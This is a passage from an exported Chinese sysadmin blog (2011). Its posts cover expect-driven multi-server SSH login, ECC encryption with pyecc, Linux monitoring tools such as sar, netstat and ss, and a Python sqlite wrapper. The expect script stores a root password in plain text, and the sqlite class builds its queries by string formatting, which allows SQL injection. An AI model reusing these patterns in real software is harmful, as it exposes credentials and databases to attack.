    "url": "/archives/linuxxiamonixshellscrtdezidongdengluduotaifuwuqicaozuominglingyijiduilinuxzhongduandeweizhikongzhi/",
    "content": "<p>前言：windows下的终端登录软件xshell或者Scrt都有自动登录以及做组操作的功能，linux下好像cssh也能作类似的东西，我闲来体验了linux下类似的操作，简单的原理是expect+gnome终端：</p>\n\n<p>请看我的主脚本：主要实现的是将testex脚本的SSH登录服务器ip修改，然后启动新终端，再执行expect脚本里面的内容，启动一个python脚本</p>\n\n<p><pre class=\"sh_python\">\ndongwm@linux-b8lh:~&gt; cat term\nimport time\nimport os\ncip = '192.168.1.6'\ni = 0\nlist = ［'192.168.1.1','192.168.1.2','192.168.1.3','192.168.1.4','192.168.1.5','192.168.1.6'］\nfor ip in list:\n    os.system('sed -i \"s/%s/%s/\" ~/testex' % (cip,ip))\n    if i &lt;3:                     #这里的move其实就是终端在屏幕上的偏移量，我的屏幕分辨率是1440＊900,根据这个不同下面的值也不同，我设计的是桌面铺满6个，一行三个\n        num = 480*i\n        move = '58x20+%s+0' % num\n    else:\n        num = 480*(i-4)\n        move = '58x20+%s+400' % num\n    cmd = 'gnome-terminal --geometry=%s -e ~/testex' % move   #--geometry选项是窗体的长＊窗体的宽+左右偏移+上下偏移, opensuse默认的效果是80x24+200+200\n    os.system(cmd)\n    cip = ip\n    print '%s done' % ip\n    i +=1\n    time.sleep(0.1)\n</pre>\n#这是一个expect脚本，语法参看我以前的文章：<a href=\"http://www.dongwm.com/archives/%e5%85%b3%e4%ba%8eexpect%e7%a0%94%e7%a9%b6%ef%bc%88%e4%ba%8c%ef%bc%89/\" target=\"_blank\">关于expect研究（二）</a>\n<pre class=\"sh_tcl\">\ndongwm@linux-b8lh:~&gt; cat testex    \n#!/usr/bin/expect\nset timeout 10\nset password 34wsetg6\\(\\#\nspawn luit -encoding gbk ssh -p 61002 root@192.168.1.6\nexpect \"#\"\nsend \"python /home/dongwm/RevSocket.py\\n\"\ninteract\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "08"
    }
  },
  {
    "id": 105,
    "title": "python使用ECC对socket数据加密",
    "category": "python",
    "tags": [
      "ECC加密算法",
      "pyecc"
    ],
    "url": "/archives/pythonshiyongeccduisocketshujujiami/",
    "content": "<p>前言：公网的数据交流自然需要加密以保证数据不被不合适的人看见。至于我为什么选择ECC，请参看:<a href=\"http://blog.163.com/aining_li@126/blog/static/67536753201162245932189/\">RSA与ECC比较 </a></p>\n\n<p>我这里使用了pyecc模块实现python的接口，但是需要一些依赖：<a href=\"http://point-at-infinity.org/seccure/\">seccure</a>,而其也需要libgcrypt和libgcrypt-dev</p>\n\n<p>1 安装<a href=\"http://point-at-infinity.org/seccure/\">seccure</a>：</p>\n\n<p>wget http://point-at-infinity.org/seccure/seccure-0.4.tar.gz\ntar zxvf seccure-0.4.tar.gz\ncd seccure-0.4 &amp;&amp; make &amp;&amp; sudo make install</p>\n\n<p>2 安装pyecc：</p>\n\n<p>git clone https://github.com/slideinc/PyECC.git\ncd PyECC/\nsudo python setup.py install</p>\n\n<p>3 使用简介：</p>\n\n<p>encrypts = pyecc.ECC.generate()</p>\n\n<p>data ＝ encrypter.encrypt('要加密的数据')</p>\n\n<p>encrypter.decrypt(data) #解密</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "08"
    }
  },
  {
    "id": 106,
    "title": "Linux运维不可不知的性能监控和调试工具（一）",
    "category": "linux基础",
    "tags": [
      "iostat",
      "mpstat",
      "pidstat",
      "sar",
      "sysstat",
      "vmstat"
    ],
    "url": "/archives/linuxyunweibukebuzhidexingnengjiankonghediaoshigongju/",
    "content": "<p><strong>前言：献给现在正在作运维或者立志作运维的朋友</strong></p>\n\n<p><strong>sysstat组件，包含了：sar，iostat，mpstat，pidstat，nfsiostat 等命令</strong></p>\n\n<p>wget http://pagesperso-orange.fr/sebastien.godard/sysstat-10.0.3.tar.gz\ntar zxvf sysstat-10.0.3.tar.gz\ncd sysstat-10.0.3/\n./configure  --enable-install-cron &amp;&amp; make &amp;&amp; sudo make install</p>\n\n<p><strong>1 sar 主要用来监控系统实时性能（CPU，内存，I / O等），以及在一个持续的基础上上，在后台性能数据收集并分析历史数据，以确定瓶颈问题</strong></p>\n\n<p><strong> 1 所有CPU的CPU使用率</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -u 1 3\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>09时23分00秒     CPU     %user     %nice   %system   %iowait    %steal     %idle\n09时23分01秒     all     23.87      0.00      3.27      0.00      0.00     72.86\n09时23分02秒     all     22.94      0.00      2.49      0.00      0.00     74.56\n09时23分03秒     all     23.50      0.00      3.00      2.00      0.00     71.50\n平均时间:     all     23.44      0.00      2.92      0.67      0.00     72.98\n<ul>\n\t<li><strong>sar -u </strong>显示CPU使用率，目前每天收集到这一点。</li>\n\t<li><strong>sar -u 1 3</strong>显示实时CPU使用率每隔1秒,3次。</li>\n\t<li><strong>sar -u  ALL 1 3“</strong>和 “sar -u 1 3”相同，还显示了附加 ​​字段。</li>\n\t<li><strong></strong><strong>sar -u -f /var/log/sa/sa10 </strong><strong></strong>显示sa10文件中10天的CPU使用率。</li>\n</ul>\n<strong>2 单个CPU或核心的CPU使用率</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -P ALL 1 1\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>09时27分08秒     CPU     %user     %nice   %system   %iowait    %steal     %idle\n09时27分09秒     all     24.31      0.00      2.51      0.00      0.00     73.18\n09时27分09秒       0     34.00      0.00      4.00      0.00      0.00     62.00\n09时27分09秒       1     47.00      0.00      3.00      0.00      0.00     50.00\n09时27分09秒       2     12.00      0.00      1.00      0.00      0.00     87.00\n09时27分09秒       3      4.00      0.00      2.00      0.00      0.00     94.00</p>\n\n<p>平均时间:     CPU     %user     %nice   %system   %iowait    %steal     %idle\n平均时间:     all     24.31      0.00      2.51      0.00      0.00     73.18\n平均时间:       0     34.00      0.00      4.00      0.00      0.00     62.00\n平均时间:       1     47.00      0.00      3.00      0.00      0.00     50.00\n平均时间:       2     12.00      0.00      1.00      0.00      0.00     87.00\n<ul>\n\t<li><strong>sar -P ALL </strong>显示当天所有核心CPU使用率。</li>\n\t<li><strong>sar -P ALL 1 3 </strong>实时显示的时间为每1秒3次的所有核心的CPU使用率。</li>\n\t<li><strong>sar -P 1，</strong>显示当前日期的CPU数1使用。</li>\n\t<li><strong>sar- P 1 1 3</strong> 实时显示的时间为核心的数字1，每1秒3次的CPU使用率。</li>\n\t<li><strong>sar  -P ALL --f  / var/log/sa/sa10</strong>显示CPU使用率，和上面解释类似</li>\n</ul>\n<strong>3 内存使用和空闲</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -r 1 3  ＃表示实时显示的时间为每1秒,3次的内存情况\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>09时31分59秒 kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact\n09时32分00秒   1282240   1991048     60.83    189256    979120   2308156     42.93   1091840    771404\n09时32分01秒   1284348   1988940     60.76    189256    979120   2304796     42.87   1089208    771404\n09时32分02秒   1282364   1990924     60.82    189272    979112   2308156     42.93   1091828    771412\n平均时间:   1282984   1990304     60.80    189261    979117   2307036     42.91   1090959    771407</p>\n\n<p><strong>4 交换分区的使用情况</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -S 1 3  ＃表示实时显示的时间为每1秒,3次的sawp使用情况\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>09时33分26秒 kbswpfree kbswpused  %swpused  kbswpcad   %swpcad\n09时33分27秒   2011680     91612      4.36      3076      3.36\n09时33分28秒   2011680     91612      4.36      3076      3.36\n09时33分29秒   2011680     91612      4.36      3076      3.36\n平均时间:   2011680     91612      4.36      3076      3.36</p>\n\n<p><strong>5 I/O状态 ＃表示实时显示的时间为每1秒3次的I/O使用情况</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -b 1 3\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>09时35分43秒       tps      rtps      wtps   bread/s   bwrtn/s\n09时35分44秒      2.00      0.00      2.00      0.00     32.00\n09时35分45秒     97.00      0.00     97.00      0.00   1192.00\n09时35分46秒      6.00      0.00      6.00      0.00    144.00\n平均时间:     35.00      0.00     35.00      0.00    456.00\n<strong>6 单个dev设备的I／O状态</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -d 1 3</p>\n\n<p>注：也可以显示成sda，sdb这样的形式：</p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -p -d 1 3\n<strong>7 显示每秒的上下文切换</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -w 1 3</p>\n\n<p><strong>8 报告运行队列和平均负载(个人最喜欢)</strong></p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -q 1 3\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)<!--more--></p>\n\n<p>09时41分02秒   runq-sz  plist-sz   ldavg-1   ldavg-5  ldavg-15   blocked\n09时41分03秒         0       416      0.25      0.26      0.39         0\n09时41分04秒         0       416      0.25      0.26      0.39         0\n09时41分05秒         1       416      0.25      0.26      0.39         0\n平均时间:         0       416      0.25      0.26      0.39         0</p>\n\n<p>注：blocked显示目前封锁和等待I / O操作完成的任务数量\n<strong>9 报告网络统计信息</strong></p>\n\n<p>sar -n KEYWORD</p>\n\n<p>KEYWORD可能是DEV(比如eth0，eth1)，NFS,SOCK,IP,TCP.ICMP,UDP,ALL等值</p>\n\n<p>dongwm@linux-b8lh:~/sysstat-10.0.3&gt; sar -n DEV 1 1\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>09时45分12秒     IFACE   rxpck/s   txpck/s    rxkB/s    txkB/s   rxcmp/s   txcmp/s  rxmcst/s\n09时45分13秒        lo      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n09时45分13秒      eth0      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n09时45分13秒      eth3      8.00      0.00      1.73      0.00      0.00      0.00      0.00\n09时45分13秒    vmnet1      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n09时45分13秒    vmnet8      0.00      0.00      0.00      0.00      0.00      0.00      0.00</p>\n\n<p>平均时间:     IFACE   rxpck/s   txpck/s    rxkB/s    txkB/s   rxcmp/s   txcmp/s  rxmcst/s\n平均时间:        lo      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n平均时间:      eth0      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n平均时间:      eth3      8.00      0.00      1.73      0.00      0.00      0.00      0.00\n平均时间:    vmnet1      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n平均时间:    vmnet8      0.00      0.00      0.00      0.00      0.00      0.00      0.00\n<strong>10 sadc 的意思是“系统活动数据收集”。 这是sar的后端工具，它的数据收集。</strong></p>\n\n<p><strong>    sa1 存储系统的活动，二进制数据文件。 为此，SA1取决于sadc。 SA1从cron运行。例如，如果今天是26号，SA1写入到/ var/log/sa/sa26，这文件是二进制文件</strong></p>\n\n<p><strong>    sa2 创建每日汇总收集的统计信息。 SA2从cron运行。创建的文件是一个ASCII文件，可以在文本编辑器编辑。</strong></p>\n\n<p><strong>   sadf 可以生成CSV，XML和其他各种格式特区的报告。 使用此与其他工具相结合的SAR数据。</strong></p>\n\n<p>设计定时任务：\ncat /etc/cron.d/sysstat\n*/10 * * * * root /usr/local/lib/sa/sa1 1 1\n53 23 * * * root /usr/local/lib/sa/sa2 -A</p>\n\n<p><strong>2 iostat 顾名思义，这个会生成CPU，I / O统计</strong>\ndongwm@linux-b8lh:~&gt; iostat\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>avg-cpu:  %user   %nice %system %iowait  %steal   %idle\n26.46    0.00    2.10    0.45    0.00   70.99</p>\n\n<p>Device:            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn\nsda               7.15        52.35        71.16    4660976    6335976\n注：使用特定盘的实现 可以这样 iostat -p sda</p>\n\n<p><strong>3  mpstat  主要报告处理器统计</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; mpstat -I ALL -u -P ALL\n<strong>4  vmstat 报告虚拟内存统计信息</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; vmstat 1 3  #这个命令很常用了 表示实时显示一秒钟,三次然后自动停止\nprocs -----------memory---------- ---swap-- -----io---- -system-- -----cpu------\nr  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n2  0  91596 1222220 195704 1036060    0    0    13    18   17   98 26  2 71  0  0\n0  0  91596 1221344 195712 1036092    0    0     0    84 1871 5774  9  2 88  1  0\n0  0  91596 1221228 195712 1036092    0    0     0   108 1987 6060 18  3 79  0  0\n<strong>5  pidstat #进程性能监测,这个我很喜欢，因为他是vmstat，top，iostat的一个结合：</strong></p>\n\n<p>pidstat -d 1   <strong> #列出当前 active 进程的 io</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; pidstat -d 1 -p $(pidof gnome-terminal)  <strong>#单个进程的状态，这里是gnome终端</strong>\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>10时04分06秒       PID   kB_rd/s   kB_wr/s kB_ccwr/s  Command\n10时04分07秒      9428      0.00      0.00      0.00  gnome-terminal\n10时04分08秒      9428      0.00      0.00      0.00  gnome-terminal\n10时04分09秒      9428      0.00      0.00      0.00  gnome-terminal\n10时04分10秒      9428      0.00      0.00      0.00  gnome-terminal</p>\n\n<p>dongwm@linux-b8lh:~&gt; pidstat -r -p $(pidof WebQQ增强版) 1<strong>  #单个进程内存使用情况</strong>\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>10时05分27秒       PID  minflt/s  majflt/s     VSZ    RSS   %MEM  Command\n10时05分28秒     24090  21133.00      0.00  654272 246492   7.53  WebQQ增强版\n10时05分29秒     24090  18880.00      0.00  654272 246492   7.53  WebQQ增强版</p>\n\n<p>dongwm@linux-b8lh:~&gt; pidstat -u -p $(pidof WebQQ增强版) 1<strong> #单个进程CPU使用情况</strong>\nLinux 2.6.37.6-0.7-default (linux-b8lh)     2011年12月14日     _i686_    (4 CPU)</p>\n\n<p>10时06分01秒       PID    %usr %system  %guest    %CPU   CPU  Command\n10时06分02秒     24090   67.00    5.00    0.00   72.00     1  WebQQ增强版\n10时06分03秒     24090   64.00    4.00    0.00   68.00     1  WebQQ增强版\n<strong></strong></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "14"
    }
  },
  {
    "id": 107,
    "title": "Linux运维不可不知的性能监控和调试工具（二）",
    "category": "linux基础",
    "tags": [
      "dstat",
      "htop",
      "netstat",
      "pmap",
      "ss",
      "vnstat"
    ],
    "url": "/archives/linuxyunweibukebuzhidexingnengjiankonghediaoshigongjuer/",
    "content": "<p><strong>1 nagios</strong></p>\n\n<p>Nagios是一个开源监控解决方案，我觉得他可以监控一切 ，可以看一下我以前的文章：<a href=\"http://www.dongwm.com/archives/category/%e7%b3%bb%e7%bb%9f%e7%9b%91%e6%8e%a7/nagios/\">NAGIOS</a></p>\n\n<p><strong>2 ps #用来查看程序的运行情况</strong></p>\n\n<p>ps -ef |grep svr.py|grep -v grep |awk '{print $2}' #查看svr.py的进程pid号\n14554</p>\n\n<p>dongwm@linux-b8lh:~&gt; ps -e -o pid,args --forest #层次结构中的进程ID</p>\n\n<p><strong>3 free #查看系统的物理（RAM）和交换内存的信息</strong>\ndongwm@linux-b8lh:~&gt;  free -mto #MB值显示，显示总计\ntotal       used       free     shared    buffers     cached\nMem:          3196       2947        249          0        264       1436\nSwap:         2053         88       1965\nTotal:        5250       3035       2215\n<strong>4 top #显示所有正在运行的进程的信息，类似于windows的资源管理器 详细的清参看：</strong><a href=\"http://www.dongwm.com/archives/%e5%85%b3%e4%ba%8etop%e7%81%b5%e5%91%bd%e7%9a%84%e7%a0%94%e7%a9%b6/\"><strong>关于top命令的研究</strong>\n</a>5 pmap #显示一个给定的进程的内存映射</p>\n\n<p>dongwm@linux-b8lh:~&gt; pmap 14443\n14443: bash\nSTART       SIZE     RSS     PSS   DIRTY    SWAP PERM MAPPING\n08048000    580K    476K     74K      0K      0K r-xp /bin/bash\n080d9000      4K      4K      4K      4K      0K r--p /bin/bash\n080da000      8K      8K      8K      8K      0K rw-p /bin/bash\n080dc000   1076K    976K    976K    976K      0K rw-p [heap]\nb744c000      8K      8K      8K      8K      0K rw-p [anon]\nb744e000    252K     32K      6K      0K      0K r--p /usr/lib/locale/zh_CN.utf8/LC_CTYPE\nb748d000   1344K     24K      2K      0K      0K r--p /usr/lib/locale/zh_CN.utf8/LC_COLLATE<!--more--></p>\n\n<p><strong>6 nestat #显示各种网络相关信息，如网络连接，路由表，接口统计等,这个很常用，比如判断某程序的端口是否在监听</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo /bin/netstat -ap |grep ssh  #-a 表示所有端口 －p显示pid\nroot's password:\ntcp        0      0 linux-b8lh.site:59073   mta1:61002              ESTABLISHED 29323/ssh\ntcp        0      0 linux-b8lh.site:35252   10.14.22.26:61300       ESTABLISHED 11986/ssh\ntcp        0      0 linux-b8lh.site:57146   mta1:61002              ESTABLISHED 9138/ssh\ntcp        0      0 linux-b8lh.site:32997   10.14.22.26:61300       ESTABLISHED 15122/ssh\ntcp        0      0 linux-b8lh.site:45807   10.14.22.26:61300       ESTABLISHED 29240/ssh\ntcp        0      0 linux-b8lh.site:35865   mta1:61002              ESTABLISHED 28751/ssh\nunix  2      [ ACC ]     STREAM     LISTENING     13182  2929/gnome-keyring- /tmp/keyring-TMukPL/ssh\nunix  3      [ ]         STREAM     CONNECTED     607118 29323/ssh\nunix  3      [ ]         STREAM     CONNECTED     607117 29326/sshfs\nunix  3      [ ]         STREAM     CONNECTED     608427 29240/ssh\nunix  3      [ ]         STREAM     CONNECTED     608426 29244/sshfs</p>\n\n<p><strong>dongwm@linux-b8lh:~&gt; sudo /bin/netstat -tunlp|grep name  ＃我常用的命令</strong>\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 172.16.180.1:53         0.0.0.0:*               LISTEN      5160/named\ntcp        0      0 172.16.110.1:53         0.0.0.0:*               LISTEN      5160/named\ntcp        0      0 192.168.8.46:53         0.0.0.0:*               LISTEN      5160/named\ntcp        0      0 127.0.0.2:53            0.0.0.0:*               LISTEN      5160/named\ntcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      5160/named\ntcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      5160/named\nudp        0      0 172.16.180.1:53         0.0.0.0:*                           5160/named\nudp        0      0 172.16.110.1:53         0.0.0.0:*                           5160/named\nudp        0      0 192.168.8.46:53         0.0.0.0:*                           5160/named\nudp        0      0 127.0.0.2:53            0.0.0.0:*                           5160/named\nudp        0      0 127.0.0.1:53            0.0.0.0:*</p>\n\n<p>dongwm@linux-b8lh:~&gt; netstat -r  #显示路由信息类似于'route -n'的输出\nKernel IP routing table\nDestination     Gateway         Genmask         Flags   MSS Window  irtt Iface\n172.16.180.0    *               255.255.255.0   U         0 0          0 vmnet8\n172.16.110.0    *               255.255.255.0   U         0 0          0 vmnet1\n192.168.8.0     *               255.255.255.0   U         0 0          0 eth3\nlink-local      *               255.255.0.0     U         0 0          0 eth3\nloopback        *               255.0.0.0       U         0 0          0 lo\ndefault         192.168.8.254   0.0.0.0         UG        0 0          0 eth3\n<strong>7 IPTraf</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo zypper install iptraf</p>\n\n<p>网络流量实时监控工具，可以监控所有的流量,IP流量,按协议分的流量,还可以设置过滤器等</p>\n\n<p>启动需要root权限，一个图形化的工具，可以抓包，报告网卡流量情况，网卡数据包个数等，我也比较喜欢它来判断一些网络问题</p>\n\n<p><strong>8 htop</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo zypper install htop</p>\n\n<p>彩色字体的top ，支持鼠标点击，对cpu使用情况。内存使用情况，当前负载情况等都直接显示，替代了top</p>\n\n<p><strong>9 dstat</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo zypper install dstat</p>\n\n<p>#彩色字体的vmstat</p>\n\n<p>dongwm@linux-b8lh:~&gt; dstat -a\n----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw\n25   2  72   0   0   0|  43k   75k|   0     0 | 107B  839B|2066  7231\n25   2  72   0   0   0|   0    40k|1328B    0 |   0     0 |2029  6175\n27   2  70   1   0   0|   0    20k|2245B 1231B|   0     0 |2191  6545\n28   1  70   0   0   0|   0     0 |1610B    0 |   0     0 |2243  6815\n25   2  72   0   0   0|   0   104k|1224B    0 |   0     0 |2075  6610</p>\n\n<p><strong>10 Strace #i like it 用于调试和故障排除Linux环境下的可执行文件的执行。 它显示了系统调用的进程所使用的过程中收到的信号,常用 ＊2 不会这个基本不要作运维了</strong></p>\n\n<p>＃strace + 可执行程序</p>\n\n<p>注：想要特定一个系统调用 使用‘-e’</p>\n\n<p><strong>11 lsof #卸载移动存储时经常提示device busy，也可能误删了一个正在打开的文件,lsof（list open files）是一个列出当前系统打开文件的工具.应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表有助于系统监测以及排错</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; lsof -a -u dongwm -d txt #查看所属root用户进程所打开的文件类型为txt的文件\ndongwm@linux-b8lh:~&gt; lsof /home  #在卸载文件系统时，如果该文件系统中有任何打开的文件，操作通常将会失败。那么通过lsof可以找出那些进程在使用当前要卸载的文件系统</p>\n\n<p>WebQQ\\xe5 24090 dongwm    2u   REG    8,7  7247256 12320783 /home/dongwm/.xsession-errors\nnotificat 27261 dongwm  mem    REG    8,7     1512 12982245 /home/dongwm/.local/share/mime/mime.cache\nbluefish  29204 dongwm  cwd    DIR    8,7    12288 12320769 /home/dongwm\nbluefish  29204 dongwm  DEL    REG    8,7          12321855 /home/dongwm/.local/share/gvfs-metadata/home-4be5293d.log\nbluefish  29204 dongwm  DEL    REG    8,7          12320866 /home/dongwm/.local/share/gvfs-metadata/home</p>\n\n<p>恢复文件：当系统中的某个文件被意外地删除了，只要这个时候系统中还有进程正在访问该文件，那么我们就可以通过lsof从/proc目录下恢复该文件的内容。思路就是lsof|grep 这个删除了的文件，如果输出了项，记住pid 和第4列的“数字＋字母”其中的数字，然后， cat /proc/那个pid/fd/那个数字 &gt; 删掉的文件 就恢复了</p>\n\n<p><strong>12 w ＃查看当前登录系统的用户</strong></p>\n\n<p><strong>13 uptime #查看当前负载的命令</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; uptime\n17:52 已启动1 天 8:41，6 个用户，平均负载：0.42, 0.26, 0.24\n<strong>14 vnstat  #用来统计网络流量</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo zypper install vnstat</p>\n\n<p>vnstati -i eth0 – -months – -output /dir/month.png ＃每月的流量统计图，做成定时任务＋html显示就更OK了</p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo vnstat-create-db eth0\nroot's password:\nError: Unable to read database \"/var/lib/vnstat/eth0\".\nInfo: -&gt; A new database has been created.\ndongwm@linux-b8lh:~&gt; vnstat --top10  #创建数据库信息，查看流量前10</p>\n\n<p><strong>15 ss #socket流量状态情况, 我喜欢</strong></p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo /usr/sbin/ss -o state established  #查看建立连接的socket\nRecv-Q Send-Q           Local Address:Port               Peer Address:Port\n0      0                 192.168.8.46:59073              60.2.235.195:61002    timer:(keepalive,60min,0)\n0      0                 192.168.8.46:52996             112.95.243.28:http\n0      0                 192.168.8.46:51066            128.121.22.144:http\n0      0                 192.168.8.46:38547            112.95.240.222:http\n0      0                 192.168.8.46:49295             74.125.71.154:http\n0      0                 192.168.8.46:46500               10.14.22.26:61300    timer:(keepalive,48min,0)</p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo /usr/sbin/ss -l  ＃显示所有的监听套接字\nRecv-Q Send-Q           Local Address:Port               Peer Address:Port\n0      3                 172.16.180.1:domain                        *:*\n0      3                 172.16.110.1:domain                        *:*\n0      3                 192.168.8.46:domain                        *:*\n0      3                    127.0.0.2:domain                        *:*\n0      3                    127.0.0.1:domain                        *:*\n0      128                  127.0.0.1:ipp                           *:*\n0      128                        ::1:ipp                          :::*\n0      128                  127.0.0.1:953                           *:*\n0      50                           *:mysql                         *:*\n0      128                         :::sunrpc                       :::*\n0      128                          *:sunrpc                        *:*\n0      128                         :::http</p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo /usr/sbin/ss -s  #显示根据类型划分的总数值统计\nTotal: 719 (kernel 769)\nTCP:   62 (estab 5, closed 16, orphaned 4, synrecv 0, timewait 2/0), ports 42</p>\n\n<p>Transport Total     IP        IPv6\n*      769       -         -\nRAW      1         1         0\nUDP      12        10        2\nTCP      46        43        3\nINET      59        54        5\nFRAG      0         0         0</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "14"
    }
  },
  {
    "id": 108,
    "title": "sqlite的python操作模板",
    "category": "sqlite",
    "tags": [
      "sqlite"
    ],
    "url": "/archives/sqlitedepythoncaozuomoban/",
    "content": "<p>前言：最近弄了一个程序，但是使用mysql这样需要服务器的数据库有些限制和浪费，尝试了一下sqlite：</p>\n\n<p><pre class=\"sh_python\">\n#!/usr/bin/env python\n#conding= gbk\n'''\n一般服务器安装python自带了sqlite3模块，但是有些机器可能安装有问题，没有——sqlite3.so这个文件，所以需要去手动安装pysqlite2，其实他们是一样的模块\n'''\ntry:\n    from sqlite3 import dbapi2 as sqlite\nexcept:\n    from pysqlite2 import dbapi2 as sqlite </p>\n\n<p>class gysqlite:\n    def __init__(self,path):\n         '''\n         初始化，path是使用的数据库文件路径\n         '''\n        self.conn = sqlite.connect(path)\n        self.cur = self.conn.cursor()  #cursor是一个记录标识，用于一行一行迭代的访问查询返回的结果\n    def create(self,table):\n         '''\n         创建table，我这里创建包含2个段 ID（数字型，自增长），Name（char 40字符），Flag（数字型）\n         '''\n        try:\n            self.cur.execute(\"CREATE TABLE IF NOT EXISTS %s(Id INTEGER PRIMARY KEY AUTOINCREMENT, Name VARCHAR(40),Flag INTEGER)\"% table)\n            self.done()\n        except sqlite.Error ,e:\n            print e\n            self.conn.rollback()\n    def insert(self,table,name,flag = 0):\n         '''\n         插入数据，指定表名，设置Name的值，Flag默认设置为0\n         '''\n        try:\n            self.cur.execute(\"INSERT INTO %s(Name,Flag) VALUES('%s',%d)\" % (table,name,flag))\n            self.done()\n        except sqlite.Error ,e:\n            print e\n            self.conn.rollback()\n    def drop(self,table):\n         '''\n        drop表\n         '''\n        try:\n            self.cur.execute(\"DROP TABLE IF EXISTS %s\" % table)\n            self.done()\n        except sqlite.Error ,e:\n            print e\n            self.conn.rollback()\n    def update(self,table,name,flag = 1):\n         '''\n         修改表条目数据，在这里主要是设置条目Flag（符合Name等于name）\n         '''\n        try:\n            self.cur.execute(\"UPDATE %s SET Flag = %d WHERE Name = '%s'\" % (table,flag,name))\n            self.done()\n        except sqlite.Error ,e:\n            print e\n            print 'sqlite update error'\n            self.conn.rollback()\n    def delete(self,table,name):\n         '''\n         删除表条目数据，在这里主要是删除Name等于name的条目\n         '''\n        try:\n            self.cur.execute(\"DELETE FROM %s WHERE Name = '%s'\" % (table,name))\n            self.done()\n        except sqlite.Error ,e:\n            print e\n            print 'sqlite delete error'\n            self.conn.rollback()\n    def selectflag(self,table,flag):\n         '''\n         select查询，返回符合Flag等于flag的条目的数据\n         '''\n        try:\n            self.cur.execute(\"SELECT * FROM %s WHERE Flag = %d\" % (table,flag))\n            rows = self.cur.fetchall()\n            return rows\n        except sqlite.Error, e:\n            print \"Error %s:\" % e.args[0]\n    def select(self,table):\n         '''\n         select查询，返回名字为table的表数据\n         '''\n        try:\n            self.cur.execute(\"SELECT * FROM %s\" % table)\n            rows = self.cur.fetchall()\n            return rows\n        except sqlite.Error, e:\n            print \"Error %s:\" % e.args[0]\n    def done(self):\n         '''\n         事务提交\n         '''\n        self.conn.commit()\n    def close(self):\n         '''\n         关闭游标\n         '''\n        self.conn.close()\n</pre></p>\n\n<p>使用方法：<!--more--></p>\n\n<p><pre class=\"sh_python\">\n&gt;&gt;&gt; from sql import gysqlite\n&gt;&gt;&gt; a = gysqlite('/home/dongwm/user.db')\n&gt;&gt;&gt; a.create('dongwm')\n&gt;&gt;&gt; a.insert('dongwm','hello')\n&gt;&gt;&gt; a.update('dongwm','hello')\n&gt;&gt;&gt; a.select('dongwm')\n[(1, u'hello', 1)]\n&gt;&gt;&gt; a.delete('dongwm','hello')\n&gt;&gt;&gt; a.select('dongwm')\n[]\n&gt;&gt;&gt; a.drop('dongwm')\n&gt;&gt;&gt; a.select('dongwm')\nError no such table: 